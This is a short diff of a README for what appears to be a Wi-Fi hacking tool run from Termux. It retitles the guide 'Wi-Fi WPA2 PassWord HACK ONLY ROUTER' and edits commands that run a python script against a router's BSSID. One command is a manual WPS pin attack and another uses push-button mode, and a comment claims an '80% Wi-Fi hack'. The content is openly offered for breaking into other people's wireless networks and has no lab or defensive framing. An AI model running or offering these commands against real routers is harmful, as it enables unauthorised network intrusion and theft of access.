@@ -1,4 +1,4 @@
-# Wi-Fi PassWord only WPA2 HACK
+# Wi-Fi WPA2 PassWord HACK ONLY ROUTER
 
 pkg install -y root-repo
 
@@ -37,6 +37,6 @@ sudo python wifi/kali-ps.py -i wlan1 -K
 
 # manual pin attack 🧷
 
-sudo python3 ps.py -i wlan0 -b d9:90:4C:C9:D0:A7 -B -p 1234
-
-sudo python3 ps.py -i wlan0 --pbc
+sudo python3 wifi/ps.py -i wlan0 -b d9:90:4C:C9:D0:A7 -B -p 1234
+# 80% Wi-Fi hack
+sudo python3 wifi/ps.py -i wlan0 --pbc
